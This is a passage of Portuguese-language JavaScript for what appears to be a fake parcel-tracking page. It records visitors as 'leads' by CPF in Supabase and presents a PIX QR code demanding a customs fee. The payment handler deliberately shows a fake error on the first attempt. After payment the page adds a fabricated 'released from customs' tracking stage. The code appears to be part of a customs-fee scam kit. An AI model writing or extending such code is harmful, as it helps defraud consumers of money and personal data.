                left: 50%;
                transform: translate(-50%, -50%);
                background: rgba(255, 255, 255, 0.9);
                padding: 20px;
                border-radius: 10px;
                text-align: center;
                z-index: 10;
                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            `;
            indicator.innerHTML = `
                <div class="processing-indicator">
                    <i class="fas fa-spinner fa-spin"></i>
                    Gerando PIX automático...
                </div>
            `;
            modal.appendChild(indicator);
        }
    }

    hidePixGenerationIndicator() {
        const indicator = document.getElementById('pixLoadingIndicator');
        if (indicator) {
            indicator.remove();
        }
        
        const qrCodeImg = document.getElementById('realPixQrCode');
        const pixCodeTextarea = document.getElementById('pixCodeModal');
        
        if (qrCodeImg) {
            qrCodeImg.style.opacity = '1';
            qrCodeImg.style.filter = 'none';
        }
        
        if (pixCodeTextarea) {
            pixCodeTextarea.style.opacity = '1';
        }
    }

    updateModalWithRealPix(pixResult) {
        console.log('🔄 Atualizando modal com PIX real da Zentra Pay...');
        
        const qrCodeImg = document.getElementById('realPixQrCode');
        if (qrCodeImg && pixResult.qrCode) {
            qrCodeImg.src = pixResult.qrCode;
            console.log('✅ QR Code atualizado com URL real');
        } else if (qrCodeImg && pixResult.pixPayload) {
            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixResult.pixPayload)}`;
            qrCodeImg.src = qrUrl;
            console.log('✅ QR Code gerado a partir do payload');
        }
        
        const pixCodeTextarea = document.getElementById('pixCodeModal');
        if (pixCodeTextarea && pixResult.pixPayload) {
            pixCodeTextarea.value = pixResult.pixPayload;
            console.log('✅ Código PIX atualizado');
        }
        
        this.currentPixData = pixResult;
    }

    closeLiberationModal() {
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    handleLiberationPayment() {
        const simulateButton = document.getElementById('simulatePaymentButton');
        if (!simulateButton) return;
        
        this.liberationAttempts++;
        console.log(`💳 Tentativa de pagamento ${this.liberationAttempts}/${this.maxLiberationAttempts}`);
        
        if (this.liberationAttempts === 1) {
            console.log('❌ Primeira tentativa - simulando erro');
            alert('Erro ao processar pagamento');
            simulateButton.innerHTML = '<i class="fas fa-redo"></i> Tentar Novamente';
            simulateButton.setAttribute('data-retry', 'true');
        } else {
            console.log('✅ Segunda tentativa - sucesso');
            this.processSuccessfulPayment();
        }
    }

    async processSuccessfulPayment() {
        console.log('🎉 Pagamento processado com sucesso!');
        
        this.isLiberationPaid = true;
        this.closeLiberationModal();
        this.addStage13();
        
        // Atualizar no Supabase
        if (this.currentCPF) {
            await this.dbService.updatePaymentStatus(this.currentCPF, 'pago');
            await this.dbService.updateLeadStage(this.currentCPF, 13);
            console.log('💾 Status atualizado no Supabase: pago, etapa 13');
        }
    }

    addStage13() {
        console.log('📦 Adicionando etapa 13: Pedido liberado');
        
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;
        
        const stage13Date = new Date();
        const stage13Item = this.createStage13Item(stage13Date);
        
        timeline.appendChild(stage13Item);
        
        setTimeout(() => {
            stage13Item.style.opacity = '1';
            stage13Item.style.transform = 'translateY(0)';
            stage13Item.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 100);
        
        const currentStatus = document.getElementById('currentStatus');
        if (currentStatus) {
            currentStatus.textContent = 'Pedido liberado na alfândega';
        }
    }

    createStage13Item(date) {
        const item = document.createElement('div');
        item.className = 'timeline-item completed new-step';
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'all 0.5s ease';
        
        const dateStr = date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
        
        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>Seu pedido foi liberado após o pagamento da taxa alfandegária</p>
                </div>
            </div>
        `;
        
        return item;
    }

    copyPixCode() {
        const pixInput = document.getElementById('pixCodeModal');
        const copyButton = document.getElementById('copyPixButtonModal');
        
        if (!pixInput || !copyButton) return;
        
        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);
            
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    this.showCopySuccess(copyButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
        }
    }

    fallbackCopy(input, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                this.showCopySuccess(button);
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
        }
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    toggleOrderDetails() {
        const content = document.getElementById('detailsContent');
        const toggleIcon = document.querySelector('.toggle-icon i');
        
        if (content && toggleIcon) {
            const isExpanded = content.classList.contains('expanded');
            
            if (isExpanded) {
                content.classList.remove('expanded');
                toggleIcon.classList.remove('rotated');
            } else {
                content.classList.add('expanded');
                toggleIcon.classList.add('rotated');
            }
        }
    }

    showLoadingNotification() {
        const notification = document.createElement('div');
        notification.id = 'trackingNotification';
        notification.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        const content = document.createElement('div');
        content.style.cssText = `
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #1e4a6b;
        `;

        content.innerHTML = `
            <div style="margin-bottom: 20px;">
                <i class="fas fa-search" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Identificando Pedido...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto consultamos o Supabase
            </p>
        `;

        notification.appendChild(content);
        document.body.appendChild(notification);
        document.body.style.overflow = 'hidden';
    }

    closeLoadingNotification() {
        const notification = document.getElementById('trackingNotification');
        if (notification) {
            notification.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    showError(message) {
        const existingError = document.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }

        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.cssText = `
            background: #fee;
            color: #c33;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid #fcc;
            text-align: center;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        `;
        errorDiv.textContent = message;

        const form = document.querySelector('.tracking-form');
        if (form) {
            form.appendChild(errorDiv);

            setTimeout(() => {
                if (errorDiv.parentNode) {
                    errorDiv.style.animation = 'slideUp 0.3s ease';
                    setTimeout(() => errorDiv.remove(), 300);
                }
            }, 5000);
        }
    }

    // Método para recarregar sistema da transportadora
    async reloadTransportadoraSystem() {
        console.log('🔄 Recarregando sistema da transportadora...');
        
        try {
            // Limpar dados antigos
            this.clearAllData();
            
            // Forçar reconexão com Supabase
            const reconnected = await this.dbService.forceReconnect();
            
            if (reconnected) {
                console.log('✅ Sistema da transportadora recarregado com sucesso');
                this.showSuccessNotification('Sistema recarregado com sucesso!');
                
                // Recarregar página após 2 segundos
                setTimeout(() => {
                    window.location.reload();
                }, 2000);
            } else {
                throw new Error('Falha na reconexão com Supabase');
            }
            
        } catch (error) {
            console.error('❌ Erro ao recarregar sistema:', error);
            this.showError('Erro ao recarregar sistema. Tente novamente.');
        }
    }

    clearAllData() {
        // Limpar dados da sessão
        this.currentCPF = null;
        this.userData = null;
        this.leadData = null;
        this.trackingData = null;
        this.isLiberationPaid = false;
        this.liberationAttempts = 0;
        
        // Limpar timers
        this.paymentTimers.forEach(timer => clearTimeout(timer));
        this.paymentTimers.clear();
        
        // Limpar localStorage relacionado
        Object.keys(localStorage).forEach(key => {
            if (key.startsWith('tracking_') || key.startsWith('cpf_')) {
                localStorage.removeItem(key);
            }
        });
        
        console.log('🧹 Dados do sistema limpos');
    }

    showSuccessNotification(message) {
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #d4edda;
            color: #155724;
            padding: 15px 20px;
            border-radius: 8px;
            border: 1px solid #c3e6cb;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            z-index: 2000;
            animation: slideInRight 0.4s ease;
            max-width: 300px;
        `;
        
        notification.innerHTML = `
            <div style="display: flex; align-items: center; gap: 10px;">
                <i class="fas fa-check-circle" style="color: #28a745; font-size: 1.2rem;"></i>
                <div>
                    <strong>${message}</strong>
                </div>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            if (notification.parentNode) {
                notification.style.animation = 'slideOutRight 0.4s ease';
                setTimeout(() => notification.remove(), 400);
            }
        }, 3000);
    }
}